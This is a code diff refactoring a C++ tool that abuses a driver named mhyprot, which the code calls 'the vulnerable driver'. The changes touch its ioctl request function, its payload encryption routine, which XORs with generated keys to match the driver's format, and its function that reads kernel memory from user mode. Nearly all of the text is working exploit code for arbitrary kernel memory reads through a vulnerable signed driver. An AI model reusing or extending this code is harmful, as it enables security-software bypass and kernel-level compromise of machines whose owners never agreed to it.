@@ -131,13 +131,16 @@ void mhyprot::unload()
 //
 // send ioctl request to the vulnerable driver
 //
-bool mhyprot::driver_impl::request_ioctl(DWORD ioctl_code, LPVOID in_buffer, DWORD in_buffer_size)
+bool mhyprot::driver_impl::request_ioctl(
+    const uint32_t ioctl_code,
+    void* in_buffer, const size_t in_buffer_size
+)
 {
     //
     // allocate memory for this command result
     //
-    LPVOID out_buffer = calloc(1, in_buffer_size);
-    DWORD out_buffer_size;
+    void* out_buffer = calloc(1, in_buffer_size);
+    DWORD out_buffer_size = 0;
 
     if (!out_buffer)
     {
@@ -161,11 +164,13 @@ bool mhyprot::driver_impl::request_ioctl(DWORD ioctl_code, LPVOID in_buffer, DWO
     //
     // store the result
     //
-    if (out_buffer_size)
+    if (!out_buffer_size)
     {
-        memcpy(in_buffer, out_buffer, out_buffer_size);
+        free(out_buffer);
+        return false;
     }
 
+    memcpy(in_buffer, out_buffer, out_buffer_size);
     free(out_buffer);
 
     return result;
@@ -257,7 +262,7 @@ uint64_t mhyprot::driver_impl::generate_key(uint64_t seed)
 //
 // encrypt the payload
 //
-void mhyprot::driver_impl::encrypt_payload(void* payload, size_t size)
+void mhyprot::driver_impl::encrypt_payload(void* payload, const size_t size)
 {
     if (size % 8)
     {
@@ -265,20 +270,20 @@ void mhyprot::driver_impl::encrypt_payload(void* payload, size_t size)
         return;
     }
 
-    if (size / 8 >= 312)
+    if (size / 8 >= 0x138)
     {
         logger::log("[!] (payload) size must be < 0x9C0");
         return;
     }
 
     uint64_t* p_payload = (uint64_t*)payload;
-    DWORD64 key_to_base = 0;
+    uint64_t offset = 0;
 
-    for (DWORD i = 1; i < size / 8; i++)
+    for (uint32_t i = 1; i < size / 8; i++)
     {
         const uint64_t key = driver_impl::generate_key(detail::seedmap[i - 1]);
-        p_payload[i] = p_payload[i] ^ key ^ (key_to_base + p_payload[0]);
-        key_to_base += 0x10;
+        p_payload[i] = p_payload[i] ^ key ^ (offset + p_payload[0]);
+        offset += 0x10;
     }
 }
 
@@ -294,7 +299,12 @@ bool mhyprot::driver_impl::read_kernel_memory(
         return false;
     }
 
-    DWORD payload_size = size + sizeof(DWORD);
+    static_assert(
+        sizeof(uint32_t) == 4,
+        "invalid compiler specific size of uint32_t, this may cause BSOD"
+        );
+
+    size_t payload_size = size + sizeof(uint32_t);
     PMHYPROT_KERNEL_READ_REQUEST payload = (PMHYPROT_KERNEL_READ_REQUEST)calloc(1, payload_size);
 
     if (!payload)
@@ -312,7 +322,7 @@ bool mhyprot::driver_impl::read_kernel_memory(
 
     if (!payload->result)
     {
-        memcpy(buffer, (PUCHAR)payload + 4, size);
+        memcpy(buffer, reinterpret_cast<uint8_t*>(payload) + sizeof(uint32_t), size);
         return true;
     }
 
